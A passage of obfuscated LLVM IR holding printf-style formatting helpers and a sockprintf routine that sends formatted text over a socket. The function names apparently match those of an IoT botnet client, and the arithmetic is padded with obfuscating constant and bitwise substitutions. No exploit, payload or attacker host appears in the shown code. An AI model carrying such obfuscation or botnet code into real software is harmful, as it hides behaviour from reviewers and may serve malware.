  br i1 %92, label %93, label %132

; <label>:93:                                     ; preds = %88
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 0
  %96 = load i32, i32* %95, align 8
  %97 = icmp ule i32 %96, 40
  br i1 %97, label %98, label %106

; <label>:98:                                     ; preds = %93
  %99 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 3
  %100 = load i8*, i8** %99, align 8
  %101 = getelementptr i8, i8* %100, i32 %96
  %102 = bitcast i8* %101 to i32*
  %103 = sub i32 0, 8
  %104 = sub i32 %96, %103
  %105 = add i32 %96, 8
  store i32 %104, i32* %95, align 8
  br label %111

; <label>:106:                                    ; preds = %93
  %107 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 2
  %108 = load i8*, i8** %107, align 8
  %109 = bitcast i8* %108 to i32*
  %110 = getelementptr i8, i8* %108, i32 8
  store i8* %110, i8** %107, align 8
  br label %111

; <label>:111:                                    ; preds = %106, %98
  %112 = phi i32* [ %102, %98 ], [ %109, %106 ]
  %113 = load i32, i32* %112, align 4
  %114 = sext i32 %113 to i64
  %115 = inttoptr i64 %114 to i8*
  store i8* %115, i8** %11, align 8
  %116 = load i8**, i8*** %4, align 8
  %117 = load i8*, i8** %11, align 8
  %118 = icmp ne i8* %117, null
  br i1 %118, label %119, label %121

; <label>:119:                                    ; preds = %111
  %120 = load i8*, i8** %11, align 8
  br label %122

; <label>:121:                                    ; preds = %111
  br label %122

; <label>:122:                                    ; preds = %121, %119
  %123 = phi i8* [ %120, %119 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), %121 ]
  %124 = load i32, i32* %7, align 4
  %125 = load i32, i32* %8, align 4
  %126 = call i32 @prints(i8** %116, i8* %123, i32 %124, i32 %125)
  %127 = load i32, i32* %9, align 4
  %128 = sub i32 %127, -2109547005
  %129 = add i32 %128, %126
  %130 = add i32 %129, -2109547005
  %131 = add nsw i32 %127, %126
  store i32 %130, i32* %9, align 4
  br label %329

; <label>:132:                                    ; preds = %88
  %133 = load i8*, i8** %5, align 8
  %134 = load i8, i8* %133, align 1
  %135 = zext i8 %134 to i32
  %136 = icmp eq i32 %135, 100
  br i1 %136, label %137, label %169

; <label>:137:                                    ; preds = %132
  %138 = load i8**, i8*** %4, align 8
  %139 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %140 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %139, i32 0, i32 0
  %141 = load i32, i32* %140, align 8
  %142 = icmp ule i32 %141, 40
  br i1 %142, label %143, label %153

; <label>:143:                                    ; preds = %137
  %144 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %139, i32 0, i32 3
  %145 = load i8*, i8** %144, align 8
  %146 = getelementptr i8, i8* %145, i32 %141
  %147 = bitcast i8* %146 to i32*
  %148 = sub i32 0, %141
  %149 = sub i32 0, 8
  %150 = add i32 %148, %149
  %151 = sub i32 0, %150
  %152 = add i32 %141, 8
  store i32 %151, i32* %140, align 8
  br label %158

; <label>:153:                                    ; preds = %137
  %154 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %139, i32 0, i32 2
  %155 = load i8*, i8** %154, align 8
  %156 = bitcast i8* %155 to i32*
  %157 = getelementptr i8, i8* %155, i32 8
  store i8* %157, i8** %154, align 8
  br label %158

; <label>:158:                                    ; preds = %153, %143
  %159 = phi i32* [ %147, %143 ], [ %156, %153 ]
  %160 = load i32, i32* %159, align 4
  %161 = load i32, i32* %7, align 4
  %162 = load i32, i32* %8, align 4
  %163 = call i32 @printi(i8** %138, i32 %160, i32 10, i32 1, i32 %161, i32 %162, i32 97)
  %164 = load i32, i32* %9, align 4
  %165 = add i32 %164, -2041754123
  %166 = add i32 %165, %163
  %167 = sub i32 %166, -2041754123
  %168 = add nsw i32 %164, %163
  store i32 %167, i32* %9, align 4
  br label %329

; <label>:169:                                    ; preds = %132
  %170 = load i8*, i8** %5, align 8
  %171 = load i8, i8* %170, align 1
  %172 = zext i8 %171 to i32
  %173 = icmp eq i32 %172, 120
  br i1 %173, label %174, label %205

; <label>:174:                                    ; preds = %169
  %175 = load i8**, i8*** %4, align 8
  %176 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %177 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %176, i32 0, i32 0
  %178 = load i32, i32* %177, align 8
  %179 = icmp ule i32 %178, 40
  br i1 %179, label %180, label %189

; <label>:180:                                    ; preds = %174
  %181 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %176, i32 0, i32 3
  %182 = load i8*, i8** %181, align 8
  %183 = getelementptr i8, i8* %182, i32 %178
  %184 = bitcast i8* %183 to i32*
  %185 = add i32 %178, -1669434587
  %186 = add i32 %185, 8
  %187 = sub i32 %186, -1669434587
  %188 = add i32 %178, 8
  store i32 %187, i32* %177, align 8
  br label %194

; <label>:189:                                    ; preds = %174
  %190 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %176, i32 0, i32 2
  %191 = load i8*, i8** %190, align 8
  %192 = bitcast i8* %191 to i32*
  %193 = getelementptr i8, i8* %191, i32 8
  store i8* %193, i8** %190, align 8
  br label %194

; <label>:194:                                    ; preds = %189, %180
  %195 = phi i32* [ %184, %180 ], [ %192, %189 ]
  %196 = load i32, i32* %195, align 4
  %197 = load i32, i32* %7, align 4
  %198 = load i32, i32* %8, align 4
  %199 = call i32 @printi(i8** %175, i32 %196, i32 16, i32 0, i32 %197, i32 %198, i32 97)
  %200 = load i32, i32* %9, align 4
  %201 = sub i32 %200, -1122193360
  %202 = add i32 %201, %199
  %203 = add i32 %202, -1122193360
  %204 = add nsw i32 %200, %199
  store i32 %203, i32* %9, align 4
  br label %329

; <label>:205:                                    ; preds = %169
  %206 = load i8*, i8** %5, align 8
  %207 = load i8, i8* %206, align 1
  %208 = zext i8 %207 to i32
  %209 = icmp eq i32 %208, 88
  br i1 %209, label %210, label %239

; <label>:210:                                    ; preds = %205
  %211 = load i8**, i8*** %4, align 8
  %212 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %213 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %212, i32 0, i32 0
  %214 = load i32, i32* %213, align 8
  %215 = icmp ule i32 %214, 40
  br i1 %215, label %216, label %224

; <label>:216:                                    ; preds = %210
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %212, i32 0, i32 3
  %218 = load i8*, i8** %217, align 8
  %219 = getelementptr i8, i8* %218, i32 %214
  %220 = bitcast i8* %219 to i32*
  %221 = sub i32 0, 8
  %222 = sub i32 %214, %221
  %223 = add i32 %214, 8
  store i32 %222, i32* %213, align 8
  br label %229

; <label>:224:                                    ; preds = %210
  %225 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %212, i32 0, i32 2
  %226 = load i8*, i8** %225, align 8
  %227 = bitcast i8* %226 to i32*
  %228 = getelementptr i8, i8* %226, i32 8
  store i8* %228, i8** %225, align 8
  br label %229

; <label>:229:                                    ; preds = %224, %216
  %230 = phi i32* [ %220, %216 ], [ %227, %224 ]
  %231 = load i32, i32* %230, align 4
  %232 = load i32, i32* %7, align 4
  %233 = load i32, i32* %8, align 4
  %234 = call i32 @printi(i8** %211, i32 %231, i32 16, i32 0, i32 %232, i32 %233, i32 65)
  %235 = load i32, i32* %9, align 4
  %236 = sub i32 0, %234
  %237 = sub i32 %235, %236
  %238 = add nsw i32 %235, %234
  store i32 %237, i32* %9, align 4
  br label %329

; <label>:239:                                    ; preds = %205
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 117
  br i1 %243, label %244, label %275

; <label>:244:                                    ; preds = %239
  %245 = load i8**, i8*** %4, align 8
  %246 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %247 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %246, i32 0, i32 0
  %248 = load i32, i32* %247, align 8
  %249 = icmp ule i32 %248, 40
  br i1 %249, label %250, label %259

; <label>:250:                                    ; preds = %244
  %251 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %246, i32 0, i32 3
  %252 = load i8*, i8** %251, align 8
  %253 = getelementptr i8, i8* %252, i32 %248
  %254 = bitcast i8* %253 to i32*
  %255 = add i32 %248, -438903442
  %256 = add i32 %255, 8
  %257 = sub i32 %256, -438903442
  %258 = add i32 %248, 8
  store i32 %257, i32* %247, align 8
  br label %264

; <label>:259:                                    ; preds = %244
  %260 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %246, i32 0, i32 2
  %261 = load i8*, i8** %260, align 8
  %262 = bitcast i8* %261 to i32*
  %263 = getelementptr i8, i8* %261, i32 8
  store i8* %263, i8** %260, align 8
  br label %264

; <label>:264:                                    ; preds = %259, %250
  %265 = phi i32* [ %254, %250 ], [ %262, %259 ]
  %266 = load i32, i32* %265, align 4
  %267 = load i32, i32* %7, align 4
  %268 = load i32, i32* %8, align 4
  %269 = call i32 @printi(i8** %245, i32 %266, i32 10, i32 0, i32 %267, i32 %268, i32 97)
  %270 = load i32, i32* %9, align 4
  %271 = add i32 %270, -1646373534
  %272 = add i32 %271, %269
  %273 = sub i32 %272, -1646373534
  %274 = add nsw i32 %270, %269
  store i32 %273, i32* %9, align 4
  br label %329

; <label>:275:                                    ; preds = %239
  %276 = load i8*, i8** %5, align 8
  %277 = load i8, i8* %276, align 1
  %278 = zext i8 %277 to i32
  %279 = icmp eq i32 %278, 99
  br i1 %279, label %280, label %315

; <label>:280:                                    ; preds = %275
  %281 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %282 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %281, i32 0, i32 0
  %283 = load i32, i32* %282, align 8
  %284 = icmp ule i32 %283, 40
  br i1 %284, label %285, label %294

; <label>:285:                                    ; preds = %280
  %286 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %281, i32 0, i32 3
  %287 = load i8*, i8** %286, align 8
  %288 = getelementptr i8, i8* %287, i32 %283
  %289 = bitcast i8* %288 to i32*
  %290 = sub i32 %283, -449920703
  %291 = add i32 %290, 8
  %292 = add i32 %291, -449920703
  %293 = add i32 %283, 8
  store i32 %292, i32* %282, align 8
  br label %299

; <label>:294:                                    ; preds = %280
  %295 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %281, i32 0, i32 2
  %296 = load i8*, i8** %295, align 8
  %297 = bitcast i8* %296 to i32*
  %298 = getelementptr i8, i8* %296, i32 8
  store i8* %298, i8** %295, align 8
  br label %299

; <label>:299:                                    ; preds = %294, %285
  %300 = phi i32* [ %289, %285 ], [ %297, %294 ]
  %301 = load i32, i32* %300, align 4
  %302 = trunc i32 %301 to i8
  %303 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %302, i8* %303, align 1
  %304 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %304, align 1
  %305 = load i8**, i8*** %4, align 8
  %306 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %307 = load i32, i32* %7, align 4
  %308 = load i32, i32* %8, align 4
  %309 = call i32 @prints(i8** %305, i8* %306, i32 %307, i32 %308)
  %310 = load i32, i32* %9, align 4
  %311 = sub i32 %310, 49456896
  %312 = add i32 %311, %309
  %313 = add i32 %312, 49456896
  %314 = add nsw i32 %310, %309
  store i32 %313, i32* %9, align 4
  br label %329

; <label>:315:                                    ; preds = %275
  br label %328

; <label>:316:                                    ; preds = %17
  br label %317

; <label>:317:                                    ; preds = %316, %35
  %318 = load i8**, i8*** %4, align 8
  %319 = load i8*, i8** %5, align 8
  %320 = load i8, i8* %319, align 1
  %321 = zext i8 %320 to i32
  call void @printchar(i8** %318, i32 %321)
  %322 = load i32, i32* %9, align 4
  %323 = sub i32 0, %322
  %324 = sub i32 0, 1
  %325 = add i32 %323, %324
  %326 = sub i32 0, %325
  %327 = add nsw i32 %322, 1
  store i32 %326, i32* %9, align 4
  br label %328

; <label>:328:                                    ; preds = %317, %315
  br label %329

; <label>:329:                                    ; preds = %328, %299, %264, %229, %194, %158, %122
  %330 = load i8*, i8** %5, align 8
  %331 = getelementptr inbounds i8, i8* %330, i32 1
  store i8* %331, i8** %5, align 8
  br label %12

; <label>:332:                                    ; preds = %29, %12
  %333 = load i8**, i8*** %4, align 8
  %334 = icmp ne i8** %333, null
  br i1 %334, label %335, label %338

; <label>:335:                                    ; preds = %332
  %336 = load i8**, i8*** %4, align 8
  %337 = load i8*, i8** %336, align 8
  store i8 0, i8* %337, align 1
  br label %338

; <label>:338:                                    ; preds = %335, %332
  %339 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %340 = bitcast %struct.__va_list_tag* %339 to i8*
  call void @llvm.va_end(i8* %340)
  %341 = load i32, i32* %9, align 4
  ret i32 %341
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %54

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %27, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %30

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add i32 %22, 1228162453
  %24 = add i32 %23, 1
  %25 = sub i32 %24, 1228162453
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %11, align 4
  br label %27

; <label>:27:                                     ; preds = %21
  %28 = load i8*, i8** %12, align 8
  %29 = getelementptr inbounds i8, i8* %28, i32 1
  store i8* %29, i8** %12, align 8
  br label %17

; <label>:30:                                     ; preds = %17
  %31 = load i32, i32* %11, align 4
  %32 = load i32, i32* %7, align 4
  %33 = icmp sge i32 %31, %32
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %30
  store i32 0, i32* %7, align 4
  br label %41

; <label>:35:                                     ; preds = %30
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub i32 0, %36
  %39 = add i32 %37, %38
  %40 = sub nsw i32 %37, %36
  store i32 %39, i32* %7, align 4
  br label %41

; <label>:41:                                     ; preds = %35, %34
  %42 = load i32, i32* %8, align 4
  %43 = xor i32 %42, -1
  %44 = xor i32 2, -1
  %45 = xor i32 175460467, -1
  %46 = or i32 %43, %44
  %47 = or i32 175460467, %45
  %48 = xor i32 %46, -1
  %49 = and i32 %48, %47
  %50 = and i32 %42, 2
  %51 = icmp ne i32 %49, 0
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %41
  store i32 48, i32* %10, align 4
  br label %53

; <label>:53:                                     ; preds = %52, %41
  br label %54

; <label>:54:                                     ; preds = %53, %4
  %55 = load i32, i32* %8, align 4
  %56 = xor i32 1, -1
  %57 = xor i32 %55, %56
  %58 = and i32 %57, %55
  %59 = and i32 %55, 1
  %60 = icmp ne i32 %58, 0
  br i1 %60, label %80, label %61

; <label>:61:                                     ; preds = %54
  br label %62

; <label>:62:                                     ; preds = %73, %61
  %63 = load i32, i32* %7, align 4
  %64 = icmp sgt i32 %63, 0
  br i1 %64, label %65, label %79

; <label>:65:                                     ; preds = %62
  %66 = load i8**, i8*** %5, align 8
  %67 = load i32, i32* %10, align 4
  call void @printchar(i8** %66, i32 %67)
  %68 = load i32, i32* %9, align 4
  %69 = add i32 %68, -1499781827
  %70 = add i32 %69, 1
  %71 = sub i32 %70, -1499781827
  %72 = add nsw i32 %68, 1
  store i32 %71, i32* %9, align 4
  br label %73

; <label>:73:                                     ; preds = %65
  %74 = load i32, i32* %7, align 4
  %75 = add i32 %74, -215982079
  %76 = add i32 %75, -1
  %77 = sub i32 %76, -215982079
  %78 = add nsw i32 %74, -1
  store i32 %77, i32* %7, align 4
  br label %62

; <label>:79:                                     ; preds = %62
  br label %80

; <label>:80:                                     ; preds = %79, %54
  br label %81

; <label>:81:                                     ; preds = %94, %80
  %82 = load i8*, i8** %6, align 8
  %83 = load i8, i8* %82, align 1
  %84 = icmp ne i8 %83, 0
  br i1 %84, label %85, label %97

; <label>:85:                                     ; preds = %81
  %86 = load i8**, i8*** %5, align 8
  %87 = load i8*, i8** %6, align 8
  %88 = load i8, i8* %87, align 1
  %89 = zext i8 %88 to i32
  call void @printchar(i8** %86, i32 %89)
  %90 = load i32, i32* %9, align 4
  %91 = sub i32 0, 1
  %92 = sub i32 %90, %91
  %93 = add nsw i32 %90, 1
  store i32 %92, i32* %9, align 4
  br label %94

; <label>:94:                                     ; preds = %85
  %95 = load i8*, i8** %6, align 8
  %96 = getelementptr inbounds i8, i8* %95, i32 1
  store i8* %96, i8** %6, align 8
  br label %81

; <label>:97:                                     ; preds = %81
  br label %98

; <label>:98:                                     ; preds = %109, %97
  %99 = load i32, i32* %7, align 4
  %100 = icmp sgt i32 %99, 0
  br i1 %100, label %101, label %116

; <label>:101:                                    ; preds = %98
  %102 = load i8**, i8*** %5, align 8
  %103 = load i32, i32* %10, align 4
  call void @printchar(i8** %102, i32 %103)
  %104 = load i32, i32* %9, align 4
  %105 = sub i32 %104, 980410997
  %106 = add i32 %105, 1
  %107 = add i32 %106, 980410997
  %108 = add nsw i32 %104, 1
  store i32 %107, i32* %9, align 4
  br label %109

; <label>:109:                                    ; preds = %101
  %110 = load i32, i32* %7, align 4
  %111 = sub i32 0, %110
  %112 = sub i32 0, -1
  %113 = add i32 %111, %112
  %114 = sub i32 0, %113
  %115 = add nsw i32 %110, -1
  store i32 %114, i32* %7, align 4
  br label %98

; <label>:116:                                    ; preds = %98
  %117 = load i32, i32* %9, align 4
  ret i32 %117
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %131

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %48

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %48

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %48

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub i32 0, 1198475393
  %45 = sub i32 %44, %43
  %46 = add i32 %45, 1198475393
  %47 = sub nsw i32 0, %43
  store i32 %46, i32* %21, align 4
  br label %48

; <label>:48:                                     ; preds = %42, %39, %36, %33
  %49 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %50 = getelementptr inbounds i8, i8* %49, i64 12
  %51 = getelementptr inbounds i8, i8* %50, i64 -1
  store i8* %51, i8** %17, align 8
  %52 = load i8*, i8** %17, align 8
  store i8 0, i8* %52, align 1
  br label %53

; <label>:53:                                     ; preds = %77, %48
  %54 = load i32, i32* %21, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %89

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* %21, align 4
  %58 = load i32, i32* %11, align 4
  %59 = urem i32 %57, %58
  store i32 %59, i32* %18, align 4
  %60 = load i32, i32* %18, align 4
  %61 = icmp sge i32 %60, 10
  br i1 %61, label %62, label %77

; <label>:62:                                     ; preds = %56
  %63 = load i32, i32* %15, align 4
  %64 = add i32 %63, -1098746409
  %65 = sub i32 %64, 48
  %66 = sub i32 %65, -1098746409
  %67 = sub nsw i32 %63, 48
  %68 = add i32 %66, -2004058953
  %69 = sub i32 %68, 10
  %70 = sub i32 %69, -2004058953
  %71 = sub nsw i32 %66, 10
  %72 = load i32, i32* %18, align 4
  %73 = sub i32 %72, 1705626867
  %74 = add i32 %73, %70
  %75 = add i32 %74, 1705626867
  %76 = add nsw i32 %72, %70
  store i32 %75, i32* %18, align 4
  br label %77

; <label>:77:                                     ; preds = %62, %56
  %78 = load i32, i32* %18, align 4
  %79 = sub i32 %78, 27846916
  %80 = add i32 %79, 48
  %81 = add i32 %80, 27846916
  %82 = add nsw i32 %78, 48
  %83 = trunc i32 %81 to i8
  %84 = load i8*, i8** %17, align 8
  %85 = getelementptr inbounds i8, i8* %84, i32 -1
  store i8* %85, i8** %17, align 8
  store i8 %83, i8* %85, align 1
  %86 = load i32, i32* %11, align 4
  %87 = load i32, i32* %21, align 4
  %88 = udiv i32 %87, %86
  store i32 %88, i32* %21, align 4
  br label %53

; <label>:89:                                     ; preds = %53
  %90 = load i32, i32* %19, align 4
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %92, label %121

; <label>:92:                                     ; preds = %89
  %93 = load i32, i32* %13, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %117

; <label>:95:                                     ; preds = %92
  %96 = load i32, i32* %14, align 4
  %97 = xor i32 %96, -1
  %98 = xor i32 2, -1
  %99 = xor i32 1366680717, -1
  %100 = or i32 %97, %98
  %101 = or i32 1366680717, %99
  %102 = xor i32 %100, -1
  %103 = and i32 %102, %101
  %104 = and i32 %96, 2
  %105 = icmp ne i32 %103, 0
  br i1 %105, label %106, label %117

; <label>:106:                                    ; preds = %95
  %107 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %107, i32 45)
  %108 = load i32, i32* %20, align 4
  %109 = sub i32 %108, 1684825691
  %110 = add i32 %109, 1
  %111 = add i32 %110, 1684825691
  %112 = add nsw i32 %108, 1
  store i32 %111, i32* %20, align 4
  %113 = load i32, i32* %13, align 4
  %114 = sub i32 0, -1
  %115 = sub i32 %113, %114
  %116 = add nsw i32 %113, -1
  store i32 %115, i32* %13, align 4
  br label %120

; <label>:117:                                    ; preds = %95, %92
  %118 = load i8*, i8** %17, align 8
  %119 = getelementptr inbounds i8, i8* %118, i32 -1
  store i8* %119, i8** %17, align 8
  store i8 45, i8* %119, align 1
  br label %120

; <label>:120:                                    ; preds = %117, %106
  br label %121

; <label>:121:                                    ; preds = %120, %89
  %122 = load i32, i32* %20, align 4
  %123 = load i8**, i8*** %9, align 8
  %124 = load i8*, i8** %17, align 8
  %125 = load i32, i32* %13, align 4
  %126 = load i32, i32* %14, align 4
  %127 = call i32 @prints(i8** %123, i8* %124, i32 %125, i32 %126)
  %128 = sub i32 0, %127
  %129 = sub i32 %122, %128
  %130 = add nsw i32 %122, %127
  store i32 %129, i32* %8, align 4
  br label %131

; <label>:131:                                    ; preds = %121, %25
  %132 = load i32, i32* %8, align 4
  ret i32 %132
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #5
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.73, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #9
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #5
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %84 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %52
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %121

